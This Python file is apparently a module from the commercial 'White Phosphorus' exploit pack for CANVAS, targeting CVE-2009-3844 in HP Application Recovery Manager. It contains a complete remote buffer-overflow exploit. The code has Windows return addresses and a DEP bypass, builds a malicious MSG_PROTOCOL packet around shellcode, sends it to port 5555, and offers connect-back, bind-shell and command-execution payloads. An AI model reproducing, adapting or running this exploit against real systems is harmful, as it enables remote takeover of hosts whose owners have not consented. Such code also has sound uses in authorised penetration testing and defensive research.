#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Hewlett-Packard Application Recovery Manager MSG_PROTOCOL Remote Overflow"
DESCRIPTION = "Remote overflow exploit for the HP Application Recovery Manager"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2009-12-08"
DOCUMENTATION["Repeatability"] = ""
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-09-091/"
DOCUMENTATION["CVE"] = "CVE-2009-3844"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3844'
DOCUMENTATION['CVSS'] = '10.0'
DOCUMENTATION["Notes"] = """
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003","ALL"]

PORT = 5555
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows 2003 SP1-SP2 DEP", (0x00000000), [WIN2K3SP1, WIN2K3SP2]],
    1 : ["Windows Other (Ret Option 1)", (0x7c345c30), [WINALL]],   # MSVCR71 Push ESP,Ret
    2 : ["Windows Other (Ret Option 2)", (0x40626c), [WINALL]]    # omniinet CALL ESP
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command",
              "Socket Reuse"]

    DEFAULT_PAYLOAD = 6
    
    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.log('WP> Checking target port')
        return wp_isPortOpen(self,self.host,self.port)        
        
    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        if self.version ==0:
            RetDepSc = self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8) 
        else:
            RetDepSc =  RetDepSc = pack('<L', targets[self.version][1])  # Non DEP return
            
        RetDepSc += self.shellcode
        
        payload = "\x00\x00\x12\xBA"                    # Length of packet
        payload += "\xff\xfe\x32\x00\x36\x00\x37\x00"   # MSG_PROTOCOL
        payload += "\x00\x00\x20\x00" + wp_randomstring(2)
        payload += "\x00\x00\x20\x00" + wp_randomstring(2)
        payload += "\x00\x00\x20\x00" + wp_randomstring(2)
        payload += "\x00\x00\x20\x00" + wp_randomstring(2)
        payload += "\x00\x00\x20\x00"       
        payload += wp_randomstring(530)
        payload += "\xFF\xFF\xFF\xFF"
        payload += wp_randomstring(1360)
        payload += RetDepSc
        payload += wp_randomstring(2770 - len(RetDepSc))
        payload += "\x00\x00\x20\x00"
        payload += wp_randomstring(90)

        return payload


    def run(self):
        self.getArgs()
        
        payload = self.makesploit()
        
        self.result_error = 0
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.sendall(payload)
            
            time.sleep(2)

            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(2)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
